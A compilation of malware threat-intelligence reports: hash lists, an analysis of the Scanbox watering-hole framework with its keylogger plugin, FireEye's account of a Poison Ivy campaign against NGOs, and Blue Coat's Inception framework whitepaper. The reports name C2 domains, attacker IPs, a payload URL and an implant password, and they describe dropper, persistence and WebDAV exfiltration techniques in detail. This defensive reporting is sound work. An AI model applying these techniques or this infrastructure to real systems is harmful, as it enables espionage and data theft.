d57ccbb25882b16198a0f43285dafbb4 7740a9e5e3feecd3b7274f929d37bccf 948cd0bf83a670c05401c8b67d2eb310 f2be8c6c62be8f459d4bb7c2eb9b9d5e 26a10fa32d0d7216c8946c8d83dd3787 8c51ba91d26dd34cf7a223eaa38bfb03 c69bfd68107ced6e08fa22f72761a869 3cd7b0d0d256d8ff8c962f1155d7ab64 298b9a6b1093e037e65da31f9ac1a807 d009c50875879bd2aefab3fa1e20be09 88b3f0ef8c80a333c7f68d9b45472b88 17b00de1c61d887b7625642bad9af954 27eddda79c79ab226b9b24005e2e9b6c 48937e732d0d11e99c68895ac8578374 82418d99339bf9ff69875a649238ac18 f9dcb0638c8c2f979233b29348d18447 72372ffac0ee73dc8b6d237878e119c1 c229a7d86a9e9a970d18c33e560f3dfc ef618bd99411f11d0aa5b67d1173ccdf 383c07e3957fd39c3d0557c6df615a1a 105586891deb04ac08d57083bf218f93 1deea42a0543ce1beeeeeef1ffb801e5 7d1e1ec1b1b0a82bd0029e8391b0b530 1f751bf5039f771006b41bdc24bfadd3 d10734a4b3682a773e5b6739b86d9b88 632bba51133284f9efe91ce126eda12d a22e08e643ef76648bec55ced182d2fe 04565d1a290d61474510dd728f9b5aae 3c1bc5680bf93094c3ffa913c12e528b 6a03d22a958d3d774ac5437e04361552 0217eb80de0e649f199a657aebba73aa 79cec7edf058af6e6455db5b06ccbc6e f8453697521766d2423469b53a233ca7 8a449de07bd54912d85e7da22474d3a9 3f9dc60445eceb4d5420bb09b9e03fbf 8f459ae20291f2721244465aa6a6f7b9 4b323d4320efa67315a76be2d77a0c83 035848a0e6ad6ee65a25be3483af86f2 90d8e7a92284789d2e15ded22d34ccc3 edb324467f6d36c7f49def27af5953a5 c1e7368eda5aa7b09e6812569ebd4242 ec99e82ad8dbf1532b0a5b32c592efdf 391b9434379308e242749761f9edda8e 6bf76626037d187f47a54e97c173bc66 895f7469e50e9bb83cbb36614782a33e 1feacbef9d6e9f763590370c53cd6a30 82234c358d921a97d3d3a9e27e1c9825 558d0a7232c75e29eaa4c1df8a55f56b e565255a113b1af8df5adec568a161f3 1821351d67a3dce1045be09e88461fe9 b1fe41542ff2fcb3aa05ff3c3c6d7d13 53c5520febbe89c25977d9f45137a114 4513e3e8b5506df268881b132ffdcde1 19ce80e963a5bcb4057ef4f1dd1d4a89 9b29903a67dfd6fec33f50e34874b68b b637f8b5f39170e7e5ada940141ddb58 c09683d23d8a900a848c04bab66310f1 6d4c2cd95a2b27777539beee307625a2 e32d5c22e90cf96296870798f9ef3d15 64c3ecfd104c0d5b478244fe670809cc b69f09eee3da15e1f8d8e8f76d3a892a 294f9e8686a6ab92fb654060c4412edf 6135bd02103fd3bab05c2d2edf87e80a b973daa1510b6d8e4adea3fb7af05870 8dce09a2b2b25fcf2400cffb044e56b8 6008f85d63f690bb1bfc678e4dc05f97 1bf8434e6f6e201f10849f1a4a9a12a4 6cac1a8ba79f327d0ad3f4cc5a839aa1 462860910526904ef8334ee17acbbbe5 eeec7c4a99fdfb0ef99be9007f069ba8 6bbc54fb91a1d1df51d2af379c3b1102 8b152fc5885cb4629f802543993f32a1 6d1187f554040a072982ab4e6b329d14 3bfe642e752263a1e2fe22cbb243de57 c629933d129c5290403e9fce8d713797 1c62b3d0eb64b1511e0151aa6edce484 811fcbadd31bccf4268653f9668c1540 0a89949a3a933f944d0ce4c0a0c57735 a0f594802fbeb5851ba40095f7d3dbd1 bf6ce6d90535022fb6c95ac9dafcb5a5 df84ff928709401c8ad44f322ec91392 fda6f18cf72e479570e8205b0103a0d3 39835e790f8d9421d0a6279398bb76dc fe6295c647e40f8481a16a14c1dfb222 592c5fbf99565374e9c20cade9ac38aa ad8dc222a258d11de8798702e52366aa bc21639bf4d12e9b01c0d762a3ffb15e 3122353bdd756626f2dc95ed3254f8bf e02d19f07f61d73fb6dd5f7d06e9f8d2 d2c7bf274edb2045bc5662e559a33942 ac1a265be63be7122b94c63aabcc9a66 e06c27e3a436537a9028fdafc426f58e 6cf2302e129911079a316cf73a4d010f 38b6ad30940ddfe684dad7a10aea1d82 f190cda937984779b87169f35e459c3a 698a41c92226f8e444f9ca7647c8068c bc95b3d795a0c28ea4f57eafcab8b5bb 82127dc2513694a151cbe1a296258850 d387a5e232ed08966381eb2515caa8e1 f4b9eb3ddcab6fd5d88d188bc682d21d 8e42fd3f9d5aac43d69ca740feb38f97 a43e8ddecfa8f3c603162a30406d5365 ea7dd992062d2f22166c1fca1a4981a1 7bf6dcf413fe71af2d102934686a816b cf064356b31f765e87c6109a63bdbf43 4a46e2dc16ceaba768b5ad3cdcb7e097 2134721de03a70c13f2b10cfe6018f36 7add5fd0d84713f609679840460c0464 cc9402e5ddc34b5f5302179c48429a56 9803e49d9e1c121346d5b22f3945bda8 c5f5837bdf486e5cc2621cc985e65019 2b72fda4b499903253281ebbca961775 7031f6097df04f003457c9c7ecbcda1c 6a6c2691fef091c1fc2e1c25d7c3c44c 9bd3fa59f30df5d54a2df385eba710a5 5100eb13cac2fc3dec2d00c5d1d3921c 0a2c2f5cf97c65f6473bdfc90113d81e 30b74abc22a5b75d356e3a57e2c84180 a0424e8436cbc44107119f62c8e7491b c1ba892d254edd8a580a16aea6f197e9 e70976785efcfaeed20aefab5c2eda60 397b5d66bac2eb5e950d2a4f9a5e5f2c 4e9bde9b6abf7992f92598be4b6d1781 54d266dee2139dd82b826a9988f35426 5b4faa2846e91e811829a594fecfe493 907448af4388072cdc01e69b7b97b174 ccad214045af69d06768499a0bd3d556 1395dfda817818c450327ab331d51c1b 715e9e60be5a9b32075189cb04a0247e 3835c8168d66104eed16c2cd99952045 f32c29a620d72ec0a435982d7a69f683 95e9162456d933fff9560bee3c270c4e da01ef50673f419cf06b106546d06b50 2dd4c551eacce0aaffedf4e00e0d03de 34f80f228f8509a67970f6062075e211 81ca7526881a0a41b6721048d2f20874 d642c73d0577dd087a02069d46f68dac .
BE3 MD5s :
f0ebb6105c0981fdd15888122355398c 7cb6363699c5fd683187e24b35dd303e 4d5c00bddc8ea6bfa9604b078d686d45 f37b67705d238a7c2dfcdd7ae3c6dfaa 46649163c659cba8a7d0d4075329efa3 628ef31852e91895d601290ce44650b1 723eb7a18f4699c892bc21bba27a6a1a 8b9f4eade3a0a650af628b1b26205ba3 f6c47fcc66ed7c3022605748cb5d66c6 6c1996c00448ec3a809b86357355d8f9 faab06832712f6d877baacfe1f96fe15 2c72ef155c77b306184fa940a2de3844 2e62e8949d123722ec9998d245bc1966 b0dc4c3402e7999d733fa2b668371ade 93fa40bd637868a271002a17e6dbd93b f98abf80598fd89dada12c6db48e3051 8a7c30a7a105bd62ee71214d268865e3 2f6582797bbc34e4df47ac25e363571d 81d127dd7957e172feb88843fe2f8dc1 3e25544414030c961c196cea36ed899d .
Previous and Parallel Research .
Botnet History Illustrated by BlackEnergy 2 , PH Days , Kaspersky Lab Maria Garnaeva and Sergey Lozhkin , May 2014 BlackEnergy and Quedagh ( pdf ) , F-Secure , September 2014 Sandworm , iSIGHT Partners , October 2014 Alert ( ICS-ALERT-14-281-01A ) Ongoing Sophisticated Malware Campaign Compromising ICS ( Update A ) , ICS-CERT , October 2014 .
Scanbox : A Reconnaissance Framework Used with Watering Hole Attacks .
A few days ago we detected a watering hole campaign in a website owned by one big industrial company .
The website is related to software used for simulation and system engineering in a wide range of industries , including automotive , aerospace , and manufacturing .
The attackers were able to compromise the website and include code that loaded a malicious Javascript file from a remote server .
This Javascript file is a framework for reconnaissance that the attackers call `` Scanbox '' and includes some of the techniques we described in a previous blog post :
Attackers abusing Internet Explorer to enumerate software and detect security products .
The Scanbox framework first configures the remote C & C server that it will use and collects a small amount of information about the victim that is visiting the compromised website including :
Referer User-Agent Location Cookie Title ( To identify specific content that the victim is visiting ) Domain Charset Screen width and height Operating System Language .
Resulting in something like this : Before sending the information to the C & C server , Scanbox encodes and encrypts the data with the following function : Producing the following request : If we decrypt the data it translates to : After the first request , the framework contains several plugins to extract different information from the victim .
Pluginid 1 : Enumerates software installed in the system using the technique we explained before that affects Internet Explorer .
It also checks if the system is running different versions of EMET ( Enhanced Mitigation Experience Toolkit ) : Producing the list of security software on the target Pluginid 2 : Enumerates Adobe Flash versions Pluginid 5 : Enumerates Microsoft Office versions Pluginid 6 : Enumerates Acrobat Reader versions Pluginid 8 : Enumerates Java versions Pluginid 21 : Implements a “ keylogger ” functionality trough Javascript that logs all the keystrokes the victim is typing inside the compromised website .
While the user is browsing the compromised website , all keystrokes are being recorded and sent to the C & C periodically .
It will also send keystrokes when the user submits web forms that can potentially include passwords and other sensitive data .
As we have seen , this is a very powerful framework that gives attackers a lot of insight into the potential targets that will help them launching future attacks against them .
We have also seen several Metasploit-produced exploits that target different versions of Java in the same IP address that hosts the Scanbox framework ( 122.10.9.109 ) .
We recommend you look for this type of activity against the following machines in your network :
mail.webmailgoogle.com js.webmailgoogle.com 122.10.9.109 .
Aided Frame , Aided Direction ( Because it ’ s a redirect ) .
Introduction :
On September 24 2014 , FireEye observed a new strategic web compromise ( SWC ) campaign that we believe is targeting non-profit organizations and non-governmental organizations ( NGO ) by hosting iframes on legitimate websites .
The compromised websites contained an iframe to direct site visitors to a threat actor-controlled IP address that dropped a Poison Ivy remote access tool ( RAT ) onto victims ’ systems .
FireEye has not yet attributed this activity though we have identified links to the Sunshop Digital Quartermaster , a collective of malware authors that supports multiple China-based advanced persistent threat ( APT ) groups .
FireEye previously established detection measures for this threat activity , ensuring our clients were prepared for these intrusion attempts well in advance of threat actor implementation .
Activity Overview :
On September 24 , FireEye observed SWCs , likely conducted by a unitary threat group based on shared infrastructure and tools , on at least three different websites : an international non-profit organization that focuses on environmental advocacy , and two different NGOs that promote democracy and human rights .
The group was able to compromise these websites and insert malicious iframes .
Figure 1 displays one of the iframes .
The threat group obfuscated the iframe on two of the compromised websites .
The iframes on these websites directed visitors to Java exploits hosted at 103.27.108.45 .
In turn , these exploits downloaded and decoded a payload hosted at : http://103.27.108.45/img/js.php .
A GET request to this URI returned the following content : The ‘ bin ’ param shown in Figure 2 is decoded from ASCII into hex by the Java exploit .
Once decoded , FireEye identified the payload as a Poison Ivy variant .
It had the following properties : The backdoor also contained the below versioning info embedded in the RT_VERSION of one of the PE resources :
LegalCopyright : Copyright 2012 Google Inc .
All rights reserved .
InternalName : chrome_exe ProcuctShortName : Chrome FileVersion : 34.0.1847.131 CompanyName : Google Inc .
OrginaLFilename : chrome.exe LegalTrademarks : ProductName : Google Chrome ComparyShortName : Google LastChange : 265687 FileDescription : Google Chrome Offcial Build : 1 PriductVersion : 34.0.1847.131 Translation : 0×0409 0x04b0 .
This versioning info attempted to masquerade as a Google Chrome file .
However , the malware author misspelled multiple words when attempting to put in versioning information for this particular build .
The Poison Ivy implant had the following configuration properties :
C2 : quakegoogle.servequake.com , Port : 80 Password : qeTGd3485fF Mutex : ) ! VoqA.I4 .
The C2 domain quakegoogle.servequake.com resolved to 115.126.62.100 at the time of the SWCs .
Other domains resolving to the same IP include the following : Between August 30 , 2014 and September 16 , 2014 we also observed SOGU ( aka Kaba ) callback traffic sent to assign.ddnsking.com over port 443 .
Links to the Sunshop Digital Quartermaster .
The Poison Ivy backdoor also had a RT_MANIFEST PE resource with a SHA256 fingerprint of 82a98c88d3dd57a6ebc0fe7167a86875ed52ebddc6374ad640407efec01b1393 .
This same RT_MANIFEST resource was documented in our previous Sunshop Digital Quartermaster report .
FireEye previously identified this specific RT_MANIFEST as the ‘ Sunshop Manifest , ’ and we have observed this same manifest resource used in 86 other samples .
As we stated in the Quartermaster report , we believe this shared resource is an artifact of a builder toolkit made available to a number of China based APT groups .
Conclusion .
This activity represents a new SWC campaign .
We suspect threat actors are leveraging their access to compromised websites belonging to NGOs and non-profits to target other organizations in the same industries .
These websites are often visited by organization employees and other organizations in the same industries , allowing threat actors to move laterally within already compromised networks or gain access to new networks .
While FireEye has not attributed this activity to a specific threat group , we frequently observe China-based threat actors target non-profits and NGOs , and we suspect that they seek to monitor activity within their borders that may lead to domestic unrest or embarrass the Chinese government .
For example , in 2013 , FireEye observed China-based threat actors steal grant applications and activity reports specifically related to an international NGO ’ s China-based activities .
We suspects threat actors sought to monitor these programs and involved individuals .
The three organizations whose websites are hosting the malicious iframes have China-based operations .
FireEye is releasing information on this campaign to allow organizations to investigate and prepare for this activity in their networks .
We believe non-profits and NGOs remain at elevated risk of intrusion and should be especially wary of attempts to compromise their networks using SWC .
Threat actors may use SWCs to achieve this goal , but FireEye does not discount the possibility that threat actors will use other means at their disposal , including phishing .
Based on past threat actor activity in this industry , FireEye expects threat actors are motivated to steal programmatic data and monitor organizations ’ programs in specific countries .
If China-based threat actors are behind the observed campaign , FireEye expects that organizations with operations in China are high-priority targets .
FireEye currently has detection measures in place that should allow users of FireEye products to detect this SWC activity .
It is also likely that other industries or organizations were affected by this SWC activity , since these sites are public facing and frequently visited .
Special thanks to Google ’ s Billy Leonard for providing additional information and research .
Thanks to the following authors for their contributions : Mike Oppenheim , Ned Moran , and Steve Stone .
This entry was posted in Threat Intelligence , Threat Research by Sarah Engle and Ben Withnell .
Bookmark the permalink .
Whitepaper : The Inception Framework : Cloud-hosted APT .
By Snorre Fagerland and Waylon Grange Blue Coat Systems , Inc .
1 .
Executive summary .
Blue Coat researchers have uncovered a previously-undocumented , highly automated , and extremely sophisticated framework for performing targeted attacks .
The framework is notable for a number of reasons , including ( but not limited to ) its use of a cloud-based infrastructure for command-and-control and its use of the WebDAV protocol to send instructions and receive exfiltrated information from compromised systems .
Initial malware components were embedded in Rich Text Format ( RTF ) files .
Exploitation of vulnerabilities in this file format is leveraged to gain remote access to victim ’ s computers .
The framework , thus far , has been using the services of a cloud service provider based in Sweden , CloudMe.com , for its main command-and-control infrastructure .
Malware payloads designed for a wide array of potential devices , including home routers and mobile devices running iOS , BlackBerryOS or Android , were also recovered during the course of our research .
The framework is designed in such a way that all post-infection communication ( i.e .
target surveying , configuration updates , malware updates , and data exfiltration ) can be performed via the cloud service .
The malware components of this framework follow a plugin model , where new malware rely on other , previously delivered malware components to interact with the framework .
Initial attacks were largely focused on Russia and a few other Eastern European countries .
However , we have later seen that attackers are interested in targets all over the globe .
The framework is itself target-agnostic , and seems highly automated .
The operational security exhibited by the attackers is very good among the best we have seen .
Most interaction between attackers and their infrastructure is performed via a convoluted network of router proxies and rented hosts .
Although the attackers have left a few clues , we have been unable to provide attribution with any degree of accuracy .
2 .
Introduction .
The use of software vulnerabilities in order to execute malicious software on unsuspecting users ’ computers is an important parameter to monitor .
This method of attack is not only known to have a considerable success rate , it is also often deployed by resourceful attackers and , as such , marks a threat worth paying attention to .
The use of exploits in document formats like PDF , DOC and RTF is in some ways especially noteworthy .
Documents are commonly exchanged via mail , which make them perfect for email-borne targeted attacks ; what is otherwise known as spear phishing .
In March , 2014 , Microsoft published information about a new vulnerability in Rich Text Format ( RTF ) .
This vulnerability , named CVE-2014-1761 ( Microsoft Word RTF Object Confusion ) , had already been used effectively by attackers at the time of the announcement .
Two previous vulnerabilities in the RTF file format , known as CVE-2010-3333 and CVE-2012-0158 , had become , by that time , mainstays of targeted attacks , so we tracked how attackers implemented this new exploit with keen interest .
By late August , we identified a malware espionage operation that used both the CVE-2014-1761 and CVE-2012-0158 vulnerabilities to trigger execution of the malicious payload , and which leveraged a single cloud service as the backbone of its entire visible infrastructure .
When we examined the suspicious documents , it was discovered that they were somewhat anomalous compared to the run-of-the-mill material .
They turned out to belong to a highly advanced and professional targeted attack framework , which utilized a complex series of techniques to survey potential targets .
Due to the many levels of obfuscation and indirection , we named this the Inception framework ; but there ends all similarity with the movie by the same name .
Leonardo DiCaprio is not associated with this investigation .
3 .
PART I : CloudMe .
4 .
Use of trojanized documents .
We initially knew little about who the actual targets were ; apart from one .
In that particular case we had the actual phishing email , so we knew the apparent recipient – the CEO of a large Russian bank .
The email was apparently sent from “ Mrs .
World ” ; note the Mrs. , and not Miss World .
The weaponized Microsoft Word document attached to the email message ( “ photo.doc ” ) contained two separate exploits : one targeting the vulnerability detailed in CVE-2012-0158 ( MSCOMCTL ActiveX Buffer Overflow ) ; the other targeting the aforementioned CVE-2014-1761 .
5 .
Above : “ Mrs .
World ” .
Text and picture apparently taken from the news site mk.ru .
We soon discovered that our malware repository contained several other , similar documents , but these had come from other sources which did not include the email message , or any identifiable information about the targets .
However , the text of the documents covered a variety of topics mostly revolving around Russian issues relating to a variety of business sectors .
The following pages highlight a representative selection of these documents .
6 .
An article cribbed verbatim from the Novye Izvestiya news Web site about the Russian financial situation in light of the Ukrainian crisis .
An application form to participate in a seminar supposedly organized by Russia ’ s Federal Service for Defense Contracts ( “ Федеральная служба по оборонному заказу ” ) scheduled for Sept 24/25 2014 .
An article , in English , about the Ukraine situation taken from the Financial Times ( UK ) newspaper .
An “ advertisement ” from a supplier of diesel engines and related mechanical services .
The letter lists the Russian navy and the Border Guard department of the FSB among their customers .
7 .
“ Organigrama Gobierno Rusia.doc ” – a summary profile of several high level Russian government officials – originally submitted to VirusTotal from an IP address in Spain .
An advertisement of a used car for sale that purportedly originated from an employee at the German Embassy in Moscow .
Invitation to Russian Art Week .
8 .
Document metadata .
All documents that we have found so far have been rather standard Word documents , of the old 97-2003 compatible format based on OLE2 .
Such documents can , and typically do , contain quite a bit of metadata : The name of the document creator ; the user who edited it most recently ; the name of the company whose copy of Word was used to create the document , et al .
Users can optionally configure Word to remove this metadata when a document is saved , and that ’ s exactly what the creator of these documents did , stripping out this potential source of attribution data .
However , Word documents in this format contain additional information , if you know where to look .
All Word documents of this format contain what ’ s known as a File Information Block ( FIB ) .
The FIB contains information about the file ’ s internal structure , and also – to some extent – data on the program used to create the file .
In the case of the samples we analyzed , all of the documents were saved using the same build of Microsoft Word from Office14 ( better known as Office 2010 ) .
In addition , documents can contain slack space in which old data remains .
For example , the decoy that came with the attack named “ Organigrama Gobierno Rusia.doc ” contains Visual Basic leftovers indicating that it originally was created on a computer that was configured to be used by a native Spanish speaker , apparently by an advisor at the Spanish Embassy in Moscow .
This document was presumably obtained by the attackers and repurposed for the attack .
9 .
Targeted verticals .
Despite the limited information at our disposal about the targets of these attacks , their content reveals some context about who the possible targets may have been .
First of all , we have the decoy documents which indicate an interest in :
Embassies Politics Finance Military Engineering .
We also have a set of phishing mails , which were targeted at :
The finance sector in Russia The oil and energy industry in Romania , Venezuela , and Mozambique Embassies and diplomats from various countries .
10 .
Shellcode .
The shellcode used is a pretty standard variant previously used by a number of campaigns typically operating out of China , but with some minor changes .
The malicious content is stored inside the document in encoded form , and the shellcode decodes and writes this to disk .
Above : The decoding loop .
Upon successful execution this code drops a Word document and a Visual Basic script .
The Word document is displayed to the user to avoid arousing any suspicion while the script is executed in the background .
Unusual for many exploit campaigns , the names of the dropped files vary ; for example HyHa9AJ.vbs , ew_Rg.vbs , 0_QHdN.vbs , etc .
– clearly randomized in order to avoid detection by name .
11 .
Visual Basic Script dropper .
The VBScript dropper code is also a little unusual .
It declares a Windows Management Instrumentation ( WMI ) object in order to reach components like the registry and file system .
This seems adapted from Microsoft example code , like the one found at http : //msdn.microsoft.com/en-us/library/aa387236 ( v=vs.85 ) .aspx .
When the VBSript is run it drops two files to disk .
One is a polymorphed dll file and the other a binary data file with no obvious internal structure .
This data file turns out to be encrypted using AES-256 .
12 .
The files will be installed in several locations :
% WinDir % , ex .
“ C : \Windows ” .
% APPDATA % , ex .
“ C : \Users\USERNAME\AppData\Roaming ” % ALLUSERSPROFILE % , ex .
“ C : \ProgramData ” % CommonProgramFiles % , ex .
“ C : \Program Files\Common Files ” % USERPROFILE % , ex .
“ C : \Users\USERNAME ” .
These locations will vary some between operating system versions .
The VBScript then sets a startup key in the “ HKCU\Software\Microsoft\Windows\CurrentVersion\Run ” registry path to execute the DLLs at boot time .
Regardless of whether the registry launches the DLL or when another malware executable starts the DLL directly , the DLL is launched using regsrv32.exe with the /s ( silent ) option .
The names of these dropped files change from attack to attack .
The one above drops ctfmonrc.dll .
Other names observed were :
ctfmonm.dll ctfmonrn.dll wmiprvse.dll alg.dll dwm.dll .
The encrypted data files are named using random words apparently taken from a dictionary – “ acholias ” , “ arzner ” , “ bicorporate ” , “ crockrell ” , “ damnatorily ” etc .
13 .
DLL payload .
Looking at one of the dropped dlls we can see the authors originally called it 95Num3P3gm.dll.polymorphed.dll .
When executed it will rebuild the original dll ( 95Num3p3gm.dll , presumably ) , load it from memory and pass over execution .
In the early stages of our research , most other payloads followed the same naming convention , eg. , fvK3J15B5d.DLL.polymorphed.DLL ; LvwU9gnFO.DLL.polymorphed.DLL ; NR5vaFTe9R.DLL.polymorphed.DLL ; hs78lg7x5F.DLL.polymorphed.DLL , etc .
More recently collected samples no longer contain the “ polymorphed ” string .
It is hard to describe the polymorphed dlls with any real depth , as there is little consistency between them .
When two nearly identical dlls are encoded using the polymorphic scheme there is very little code in common .
The call graphs are different and key functions have varying number of arguments .
The polymorphing mechanism also generates , and inserts , unique functions all of which make calls to different floating-point operations – all done just to obfuscate the actual decoding process .
The sizes of buffers allocated are also randomized to mask their intent .
14 .
A portion of one of the dynamically generated functions .
What is common is that somewhere along the execution cycle is one extremely large function ( over 200 kb in length ) where early in a large allocation is made where the un-obfuscated binary will be placed .
The binary is then built from de obfuscating segments of it that have been dispersed through the ‘ .rdata ’ section .
The order , size , and locations of these segments vary from build to build but somewhere near the end of the large function there will be a call to a subfunction that loads the PE image into memory , followed by a call to free the PE image allocation from memory .
Simply halting execution before this function call permits a researcher to extract the reconstructed DLL from memory .
15 .
Here , pausing execution before the call to ‘ load_pe_from_memory ’ reveals the extracted PE at the memory address pointed to by edx .
This reconstructed DLL , once loaded , will decode a configuration structure from its ‘ .data ’ section which contains three important details : the name of the encrypted data file dropped by the VBScript ; the AES key used to decrypt the file ; and the name of a unique global mutex to hold while running to prevent multiple instances .
This configuration information is used to load the encrypted file into memory and decrypt it .
This turns out to be yet another dll .
The first ordinal exported by this dll is located and then called , passing in the configuration and the name of the encrypted file on disk as parameters .
16 .
This last dll is the heart of the threat ( originally called q5Byo.dll in this instance .
This file contains the true intent of this campaign .
It is designed as a survey tool .
The PE file gathers system information including OS version , computer name , user name , user group membership , the process it is running in , locale ID ’ s , as well as system drive and volume information .
All of this is encrypted and then sent to cloud storage via WebDAV .
17 .
The malware installation chain .
18 .
WebDAV cloud usage .
WebDAV is a communication standard that allows file management over HTTP or HTTPS .
Windows allows WebDAV sessions to be mapped as network resources .
The use of WebDAV as the communication channel is atypical for most malware samples we see .
By using a network resource , the actual web traffic originates from the system itself , and not from the process in which the malware resides .
Additionally , once the resource is established , the malware can transfer files to and from the command and control servers using standard file IO commands .
All the authentication information for the WebDAV session including the URL , folders , path , user name , and password is stored within this last DLL in another AES-encrypted configuration structure in the binary .
A unique path , username , and password were used for each malware instance we ’ ve seen in the wild .
This allows the attackers to uniquely identify every targeted attack and track how successful each phishing campaign is .
Also contained within the configuration structure is information on how to name the survey data on the remote file server .
The binary reads from its configuration a string on how to generate the remote filename , and a list of extensions to use .
An example would be “ _1-7d_0-8s ” , [ “ TIF ” , “ TAR ” , “ SIT ” ] which instructs the binary to generate a filename with 1 to 7 numeric digit characters followed by 0 to 8 ASCII letters with one of the three listed extensions such as “ 664gher.TAR ” .
The survey is then uploaded to the server in a specified folder with the generated name .
Files are compressed using a modified LZMA-compression and encrypted using AES cipher-block-chaining ( CBC ) before being uploaded to the cloud server .
The binary also checks a separate folder on the cloud service designated to contain new configuration information .
If such a file is present on the server , the malware downloads the new configuration file then deletes it from the server .
19 .
The cloud storage provider in every case we have seen was the Swedish company CloudMe.com , which offers free and paid WebDAV cloud storage .
The URI model used by the malware is http://webdav.cloudme.com/%username%/CloudDrive/ which is a direct reference to file storage .
It must be noted that the CloudMe service is not actively spreading the malicious content ; the attackers are only using it for storing their files .
We notified CloudMe.com about the abuse of their services .
Their CEO , Mr .
Daniel Arthursson , was none too happy about this , and was very helpful in our further research .
CloudMe has shared a great deal of log information related to this attack .
These indicate that there are many other accounts ( over 100 ) likely related to this attack system .
We have no way of verifying this with absolute certainty , but this is what we regard as a high confidence assumption .
20 .
Distribution of logged victim connections towards CloudMe .
The cloud accounts are not used for one-way communication only .
The malware also checks configured subfolders for updates ; and if these are found they will be downloaded , decrypted and used as appropriate .
One such case is the franko7046 account , used against the previously mentioned bank CEO .
In this account there was hidden another encrypted configuration file which the malware downloaded and decrypted .
Above : The configuration file of the depp3353 account .
Password is redacted .
21 .
This is how we found the depp3353 account .
In this new account there was another surprise waiting for us – a download folder with two new encrypted files , 921.bin and 922.bin .
Once decrypted , these turned out to be PE executables .
Downloaded plugins : Cloud persistence .
The two new executables are plugins quite similar to each other and obviously compiled on the same setup .
They are lightweight and intended to pull specific survey information from their target .
Of interest , both of the DLLs originally had the same internal name ( 78wO13YrJ0cB.dll ) .
Presumably the same PE sanitization script and parameters were used on both .
None of these plugins contain any means of CnC communication .
Instead , when they are executed they are passed a pointer to a function to use for sending data back home .
Neither are they ever written to disk .
They are executed in memory only , and once they have completed the memory is freed .
This makes these modules extremely stealthy , flexible and compatible with multiple toolsets independent of what CnC method is being used .
921.bin retrieves several datapoints about the infected machine : Domain info ; a list of running processes with all loaded modules in each ; the list of installed software ; and a complete hardware profile of the target machine .
922.bin compiles a dirwalk – a complete listing of every file path – of each fixed drive .
All of this information is exfiltrated back via the same WebDAV connection .
This model makes it possible to do the intrusion in steps , with verification stages in between ; and the files will not be easily found on affected computers .
Based on the information gathered from these modules , the attackers appear to move to the next stage of their attack by placing more new components on the WebDAV shares .
Information about these uploads is limited by the fact that we do not have the AES keys to decrypt much of the uploaded data , but we have been able to see some upload patterns .
What we assume to be third-stage plugins appear on the shares as * .bin files of roughly 72kb .
As with other plugins , these are downloaded and deleted from the share in one go .
However , the next day , another * .bin file of the same size will be uploaded to the share .
This is a pattern that repeats itself over all live accounts .
It seems that because the plugins exist in memory only , they are injected daily to ensure persistence on victim computers .
Our theory is that this malware is a more typical datastealer , and we have observed that after this type of file is planted on the account , encrypted data uploads from compromised users increase .
22 .
The Sheep and the Wolves .
Victims of this attack will connect using the Windows WebDAV redirector , and the HTTP request user-agent string will reflect this .
For Windows XP this will typically be “ Microsoft-WebDAV-MiniRedir/5.1.2600 ” , and for Windows 7 a common user-agent is “ Microsoft-WebDAV-MiniRedir/6.1.7601 ” .
Security researchers – and there are a few of them connect in a variety of ways ; first of all , we see a number of connections that are indistinguishable from the way victims connect .
This happens when researchers use lab machines with live internet access to run the malware .
The only way we can tell these are researchers is because they connect from IP address ranges that are unlikely to be victims ; and they also tend to consist of short-lived sessions .
Some researchers set up scheduled tasks to scan the shares for new updates and malware .
We see a few variations of these – one typical configuration is where the requests contain a Python-related user-agent string .
Attackers , on the other hand , don ’ t appear to use Windows .
Common across multiple accounts , multiple IP ’ s , and over time , is that the probable attackers have used a HTTP user-agent of “ davfs2/1.4.6 neon/0.29.6 ” .
We know these are not researchers , because we can see malware files being uploaded by them :
[ 17/Sep/2014:09:42:38 +0200 ] `` PUT /white3946/CloudDrive/QxM9C/st/V1oINDJtnqy/1768.bin HTTP/1.0 '' 201 0 `` - '' `` davfs2/1.4.6 neon/0.29.6 '' .
Above : Log entry for the account white3946 .
We have been unable to locate the malware that uses this account .
We have a log fragment in which the attackers uploaded a sequential series of updates ( from 1746.bin to 1774.bin ) within 1.5 hours on Sept 17th , spread over 27 different accounts and using 27 different IP addresses in the process .
The user-agent string shows that attackers likely have used a client based on the open source davfs2 file system for Linux to mount the WebDAV shares .
23 .
This client is used when uploading new malware , but also when the attackers scan their shares for new victim updates , in which case the shares are enumerated by requests in a scheduled manner .
An attacker scans the tem5842 account for updates .
At intervals , scans hop to new IP addresses .
The attackers have used a large number of IP addresses to access the shares .
As mentioned above , there is a rotation scheme in place in which a new IP address will be used after a few minutes of access against CloudMe accounts .
These IP ’ s are distributed widely over geographical locations and service providers , with a heavy bias towards South Korean ranges .
24 .
S .
Korea 85 Australia 1 China 7 Austria 1 United States 7 Bulgaria 1 Brazil 5 Canada 1 Sweden 3 Denmark 1 Czech Republic 2 France 1 Norway 2 Germany 1 Romania 2 Kuwait 1 Russia 2 Latvia 1 Spain 2 Ukraine 1 .
Distribution of attacker IP addresses .
At first we thought these IP ’ s belonged to some commercial proxy service , particularly since several such proxy services also offer IP rotation .
However , this turned out to be a wrong assumption .
25 .
PART II : Support infrastructure .
26 .
An embedded device proxy network .
A superficial examination of the proxy IP addresses that connected to CloudMe showed them to be internet-connected devices of various kinds .
Many were Korean Tera-EP home routers ; but there were several other products represented .
It is believed that the attackers were able to compromise these devices based on poor configurations or default credentials .
We were able to do some forensic work on a compromised Tera-EP TE-800 device and discovered another dimension of the attacker ’ s infrastructure .
27 .
Router malware .
Under the ramfs mounted partition we found a stripped and statically linked MIPS-el binary named tail- .
Instances of this were also found under the running process list .
tail serves as a SOCKS proxy for the attackers .
Each sample of the binary we were able to acquire was configured with a unique 32byte blowfish key and a small , encrypted section appended to the end of the binary .
Upon execution the binary uses its hardcoded key to decrypt the configuration section and retrieve the listening port to use for incoming connections .
This acts as a management interface .
From here the attackers can request a specific port to be opened as one of the following types : SOCKET , SOCKSS , SOCKAT , SOCKS5 , or STATUSPORT .
To prevent anyone else from accessing this service all communication on the management interface is encrypted using the same blowfish key .
This means that the attackers must maintain a list of where each of these implants are installed , as well as what port and key each is configured to use .
This setup makes it difficult to identify embedded devices compromised with this malware by scanning open ports .
In the wild we witnessed the attackers connect to the management port and request SOCKSS connections .
This would open the specified port and wait for configuration data , which consists of a domain name ( webdav.cloudme.com ) , the destination port , and a variable length RC4 key , all of which encrypted using the blowfish key .
Once received the malware would attempt to connect to the domain name on the specified port and would start tunneling all traffic received from the SOCKSS port to the destination and vise-versa .
